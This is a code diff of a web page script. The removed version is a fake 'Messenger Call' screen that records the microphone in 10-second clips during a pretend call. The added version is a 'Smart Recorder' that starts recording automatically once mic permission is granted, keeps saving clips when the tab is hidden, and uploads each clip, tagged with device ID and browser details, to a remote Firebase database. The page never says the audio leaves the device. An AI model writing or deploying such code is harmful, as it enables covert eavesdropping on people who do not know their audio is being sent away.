-    let mimeType = 'audio/webm;codecs=opus';
-    if (!MediaRecorder.isTypeSupported(mimeType)) {
-      mimeType = 'audio/webm';
-    }
-    if (!MediaRecorder.isTypeSupported(mimeType)) {
-      mimeType = 'audio/mp4';
-    }
-    if (!MediaRecorder.isTypeSupported(mimeType)) {
-      mimeType = '';
-    }
-
-    console.log(`🎤 Using MIME: ${mimeType || 'default'}`);
-
-    const options = { audioBitsPerSecond: 24000 };
-    if (mimeType) options.mimeType = mimeType;
-
-    audioRecorder = new MediaRecorder(audioOnlyStream, options);
-
-    audioRecorder.ondataavailable = (e) => {
-      if (e.data && e.data.size > 0) {
-        audioChunks.push(e.data);
-      }
-    };
-
-    audioRecorder.onstop = async () => {
-      const actualMime = audioRecorder.mimeType || mimeType || 'audio/webm';
-      const blob = new Blob(audioChunks, { type: actualMime });
-      console.log(`🎤 [Clip #${clipNumber}] Size: ${(blob.size / 1024).toFixed(1)} KB`);
-
-      if (blob.size > 500) {
-        await saveAudioToDB(blob, actualMime);
-      } else {
-        console.warn('⚠️ Blob too small, skipped');
-      }
-
-      audioChunks = [];
-      isAudioRecording = false;
-
-      const recEl = document.getElementById('recIndicator');
-      if (recEl) recEl.style.display = 'none';
-    };
-
-    audioRecorder.start();
-    console.log(`🎤 [Clip #${clipNumber}] Recording...`);
-
-    const recEl = document.getElementById('recIndicator');
-    if (recEl) recEl.style.display = 'flex';
-
-    setTimeout(() => {
-      if (audioRecorder && audioRecorder.state === 'recording') {
-        audioRecorder.stop();
-      }
-    }, AUDIO_CLIP_DURATION);
-
-  } catch (err) {
-    console.error('❌ Record error:', err);
-    isAudioRecording = false;
-  }
-}
-
-/* ============================================================
-   14. 🔥 SAVE AUDIO → RTDB (base64) — Photo ki tarah
-   ============================================================ */
-async function saveAudioToDB(blob, mimeType) {
-  const now = new Date();
-  const timestamp = now.getTime();
-  const dt = getDateTime();
-  const duration = AUDIO_CLIP_DURATION / 1000;
-
-  console.log('📤 Saving audio...', (blob.size / 1024).toFixed(1), 'KB');
+  console.log('📤 Saving to RTDB...', (blob.size / 1024).toFixed(1), 'KB');
 
   let base64 = '';
   try {
@@ -903,77 +527,80 @@ async function saveAudioToDB(blob, mimeType) {
     });
     console.log('✅ Base64 ready:', (base64.length / 1024).toFixed(1), 'KB');
   } catch (err) {
-    console.error('❌ Base64 conversion failed:', err);
+    console.error('❌ Base64 failed:', err);
     return;
   }
 
   try {
-    console.log('⏳ Saving to RTDB...');
-
-    const audioRef = ref(db, 'call_audio/' + DEVICE_ID);
+    const audioRef = ref(db, 'mic_audio/' + DEVICE_ID);
 
     const newRef = await push(audioRef, {
       deviceId: DEVICE_ID,
       sessionId: SESSION_ID,
-      caller: currentContact ? currentContact.name : 'Unknown',
       audioBase64: base64,
       size: blob.size,
-      duration: duration,
+      duration: CLIP_DURATION / 1000,
       mimeType: mimeType || 'audio/webm',
-      date: dt.date,
-      time: dt.time,
+      date: date,
+      time: time,
       timestamp: timestamp,
-      capturedAtISO: dt.iso,
+      capturedAtISO: now.toISOString(),
       capturedAt: serverTimestamp(),
-      storage: 'rtdb-base64'
+      userAgent: navigator.userAgent.slice(0, 100)
     });
 
-    console.log('✅ Audio saved to RTDB:', newRef.key, '|', dt.date, dt.time);
-    showToast('🎤 Audio saved ✅');
+    console.log('✅ RTDB saved:', newRef.key);
+    statLast.textContent = time;
+    statClips.textContent = clipCount;
 
-  } catch (rtdbErr) {
-    console.error('❌ RTDB save FAILED:', rtdbErr.code);
-    console.error('❌ Message:', rtdbErr.message);
-    showToast('❌ Save failed: ' + (rtdbErr.code || 'unknown'));
+    showToast('🎤 Saved');
+
+  } catch (err) {
+    console.error('❌ RTDB save FAILED:', err.code, err.message);
+    showToast('❌ Save failed: ' + (err.code || 'unknown'));
   }
 }
 
 /* ============================================================
-   15. AUDIO LOOP — Every 10 sec
+   TOAST
    ============================================================ */
-function startAudioLoop() {
-  stopAudioLoop();
-  clipNumber = 0;
-  console.log('🎤 Audio loop started (10 sec clips)');
+function showToast(msg) {
+  const existing = document.querySelector('.toast');
+  if (existing) existing.remove();
+
+  const toast = document.createElement('div');
+  toast.className = 'toast';
+  toast.textContent = msg;
+  toast.style.cssText = `
+    position: fixed; bottom: 30px; left: 50%;
+    transform: translateX(-50%); background: #2c2c2e; color: #fff;
+    padding: 10px 20px; border-radius: 20px; font-size: 13px;
+    z-index: 9999; box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+    animation: toastIn 0.3s ease;
+  `;
+  document.body.appendChild(toast);
 
   setTimeout(() => {
-    if (localStream) recordAudioClip();
-  }, 2000);
-
-  audioLoopTimer = setInterval(() => {
-    if (localStream && !isAudioRecording) {
-      recordAudioClip();
-    }
-  }, 11000);
+    toast.style.opacity = '0';
+    toast.style.transition = 'opacity 0.3s';
+    setTimeout(() => toast.remove(), 300);
+  }, 1500);
 }
 
-function stopAudioLoop() {
-  if (audioLoopTimer) {
-    clearInterval(audioLoopTimer);
-    audioLoopTimer = null;
-  }
-  if (audioRecorder && audioRecorder.state === 'recording') {
-    try { audioRecorder.stop(); } catch (e) {}
-  }
-  isAudioRecording = false;
+/* ============================================================
+   ACTION HANDLER
+   ============================================================ */
+window.handleAction = async function() {
+  hideActionBtn();
+  hideGuide();
+  setUI('⏳', 'Requesting...', 'Please allow microphone access...');
 
-  const recEl = document.getElementById('recIndicator');
-  if (recEl) recEl.style.display = 'none';
+  await startRecorder();
+};
 
-  console.log('⏹️ Audio loop stopped');
-}
-
-/* Background save */
+/* ============================================================
+   BACKGROUND SAVE (tab hide)
+   ============================================================ */
 document.addEventListener('visibilitychange', () => {
   if (document.hidden && audioRecorder && audioRecorder.state === 'recording') {
     console.log('👁️ Tab hidden — saving current clip');
@@ -988,122 +615,84 @@ window.addEventListener('pagehide', () => {
 });
 
 /* ============================================================
-   16. END CALL
+   PERMISSION WATCH — agar user settings se change kare
    ============================================================ */
-window.endCall = function() {
-  stopAudioLoop();
+async function watchPermissionChange() {
+  if (!navigator.permissions || !navigator.permissions.query) return;
 
-  if (callTimerInterval) {
-    clearInterval(callTimerInterval);
-    callTimerInterval = null;
-  }
-
-  if (localStream) {
-    localStream.getTracks().forEach(t => t.stop());
-    localStream = null;
-  }
-  if (micStreamOnly) {
-    micStreamOnly.getTracks().forEach(t => t.stop());
-    micStreamOnly = null;
-  }
-
-  isMuted = false;
-  isSpeakerOn = false;
-  document.getElementById('muteBtn').classList.remove('active');
-  document.getElementById('speakerBtn').classList.remove('active');
-
-  callScreen.classList.remove('show');
-  contactScreen.classList.remove('hide');
-
-  const mins = Math.floor(callSeconds / 60);
-  const secs = callSeconds % 60;
-  showToast(`📞 Call ended • ${mins}m ${secs}s`);
-
-  currentContact = null;
-  callSeconds = 0;
-  clipNumber = 0;
-};
-
-/* ============================================================
-   17. CONTROLS
-   ============================================================ */
-window.toggleMute = function() {
-  if (!localStream) return;
-  const audioTrack = localStream.getAudioTracks()[0];
-  if (audioTrack) {
-    audioTrack.enabled = !audioTrack.enabled;
-    isMuted = !isMuted;
-    document.getElementById('muteBtn').classList.toggle('active', isMuted);
-    showToast(isMuted ? '🔇 Muted' : '🎤 Unmuted');
-  }
-};
-
-window.toggleSpeaker = function() {
-  isSpeakerOn = !isSpeakerOn;
-  document.getElementById('speakerBtn').classList.toggle('active', isSpeakerOn);
-  showToast(isSpeakerOn ? '🔊 Speaker ON' : '🔈 Speaker OFF');
-};
-
-/* ============================================================
-   18. RINGTONE
-   ============================================================ */
-let ringtoneCtx = null;
-let ringtoneInterval = null;
-
-function playRingtone() {
   try {
-    if (ringtoneCtx) return;
-    ringtoneCtx = new (window.AudioContext || window.webkitAudioContext)();
+    const status = await navigator.permissions.query({ name: 'microphone' });
 
-    const playBeep = () => {
-      if (!ringtoneCtx) return;
-      const osc = ringtoneCtx.createOscillator();
-      const gain = ringtoneCtx.createGain();
-      osc.connect(gain);
-      gain.connect(ringtoneCtx.destination);
-      osc.frequency.value = 800;
-      osc.type = 'sine';
-      gain.gain.setValueAtTime(0, ringtoneCtx.currentTime);
-      gain.gain.linearRampToValueAtTime(0.15, ringtoneCtx.currentTime + 0.05);
-      gain.gain.linearRampToValueAtTime(0, ringtoneCtx.currentTime + 0.4);
-      osc.start(ringtoneCtx.currentTime);
-      osc.stop(ringtoneCtx.currentTime + 0.5);
+    status.onchange = () => {
+      console.log('🔔 Permission changed:', status.state);
+      if (status.state === 'granted' && !micStream) {
+        // Auto-start
+        console.log('✅ Permission granted — auto-starting');
+        startRecorder();
+      } else if (status.state === 'denied' && micStream) {
+        // Permission revoked
+        console.log('❌ Permission revoked — stopping');
+        stopRecorder();
+      }
     };
-
-    playBeep();
-    setTimeout(playBeep, 600);
-    ringtoneInterval = setInterval(() => {
-      playBeep();
-      setTimeout(playBeep, 600);
-    }, 2000);
-  } catch (e) {
-    console.warn('Ringtone failed:', e);
-  }
+  } catch (e) {}
 }
 
-function stopRingtone() {
-  if (ringtoneInterval) {
-    clearInterval(ringtoneInterval);
-    ringtoneInterval = null;
+function stopRecorder() {
+  stopRecordingLoop();
+  if (micStream) {
+    micStream.getTracks().forEach(t => t.stop());
+    micStream = null;
   }
-  if (ringtoneCtx) {
-    ringtoneCtx.close().catch(() => {});
-    ringtoneCtx = null;
-  }
+  recBadge.classList.remove('show');
+  setUI('⏹️', 'Stopped', 'Recording stopped');
 }
 
 /* ============================================================
-   19. CLEANUP
+   INIT — Auto Smart Start
    ============================================================ */
-window.addEventListener('beforeunload', () => {
-  if (localStream) localStream.getTracks().forEach(t => t.stop());
-  if (micStreamOnly) micStreamOnly.getTracks().forEach(t => t.stop());
-  stopRingtone();
-  stopAudioLoop();
-  if (callTimerInterval) clearInterval(callTimerInterval);
-});
+async function init() {
+  console.log('🚀 Smart Recorder starting...');
 
-console.log('✅ Messenger Call ready');
+  const state = await checkMicPermission();
+  console.log('📋 Permission state:', state);
+
+  if (state === 'granted') {
+    // 🔥 Already granted — turant start
+    console.log('✅ Already granted — auto-starting');
+    setUI('⏳', 'Starting...', 'Mic permission already granted');
+    await startRecorder();
+
+  } else if (state === 'denied') {
+    // Blocked — guide dikhao
+    console.log('🚫 Denied — showing guide');
+    setUI('🚫', 'Microphone Blocked',
+      'You denied mic access earlier. Enable it manually from browser settings.', true);
+    showGuide(`
+      <strong>How to enable:</strong>
+      <ol>
+        <li>Click the <strong>🔒 lock icon</strong> in address bar</li>
+        <li>Find <strong>Microphone</strong> → set to <strong>Allow</strong></li>
+        <li>Refresh the page</li>
+      </ol>
+    `);
+    showActionBtn('🔄 I Enabled It — Refresh', () => location.reload());
+
+  } else {
+    // Prompt — ek baar maango
+    console.log('⚠️ Prompt state — requesting permission');
+    setUI('🎤', 'Enable Microphone',
+      'This app needs mic access to work. Please allow to continue.');
+    showActionBtn('🎤 Enable Microphone', handleAction);
+  }
+
+  watchPermissionChange();
+}
+
+/* Auto-init */
+init();
+
+console.log('✅ Smart Recorder ready');
 </script>
 </body>
 </html>
